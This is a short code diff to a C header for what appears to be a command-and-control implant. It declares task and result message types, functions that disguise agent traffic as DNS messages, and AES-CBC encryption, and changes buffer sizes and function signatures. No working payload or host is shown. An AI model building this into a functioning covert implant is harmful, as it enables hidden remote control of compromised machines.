@@ -18,8 +18,9 @@
 #define DNS_AUTHORITY_OFFSET 8
 #define DNS_ADDITIONAL_OFFSET 10
 #define KEY_SIZE 32
-#define KEY_BUFF_SIZE 44
+#define KEY_BUFF_SIZE 440
 #define IV_SIZE 16
+#define AES_BLOCK_SIZE 16
 
 #define MSG_AGENT_GET_TASK 0x1001
 #define MSG_AGENT_POST_RESULT 0x1002
@@ -115,7 +116,7 @@ VOID FreeTlvMessage(TLV_MESSAGE* msg);
 * 
 * @return TRUE on success, FALSE on failure
 */
-BOOL EncodeDNS(PBYTE* msg, USHORT taskId, DWORD type, DWORD* payloadLength, PBYTE payload);
+BOOL EncodeDNS(PBYTE msg, USHORT taskId, DWORD type, DWORD payloadLength, PBYTE payload);
 
 /**
 * @brief decodes a DNS-masked message to TLV format
@@ -137,7 +138,7 @@ BOOL DecodeDNS(PBYTE buff, PBYTE* out);
 * 
 * @return TRUE on success, FALSE on failure
 */
-BOOL Encrypt(PBYTE* msg, DWORD msgLength);
+BOOL Encrypt(PBYTE msg, DWORD msgLength);
 
 /**
 * @brief Decrypts a message using AES CBC-mode
